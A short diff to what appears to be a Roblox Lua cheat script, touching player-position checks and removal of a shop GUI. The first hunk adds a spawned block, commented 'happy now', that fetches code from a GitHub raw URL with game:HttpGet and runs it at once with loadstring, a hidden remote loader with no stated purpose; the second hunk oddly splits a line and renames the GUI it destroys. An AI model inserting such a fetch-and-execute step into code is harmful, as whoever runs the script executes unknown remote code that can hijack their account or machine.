@@ -249,6 +249,10 @@ spawn(
     end
 )
 
+spawn(function() -- happy now
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HazeWasTaken/PayPal/master/reeeeeeee", true))()
+end)
+
 local function checkPlayerOutbounds(plrName)
     plrTorso = game:GetService("Players"):FindFirstChild(plrName).Character.HumanoidRootPart
 
@@ -1806,7 +1810,8 @@ if true then
     )
     pcall(
         function()
-            game:GetService("Players").LocalPlayer.PlayerGui.NitroShopGui:Destroy()
+            game:GetService("Players").LocalPlayer.PlayerGui.
+                     ShopGui:Destroy()
         end
     )
     wait()
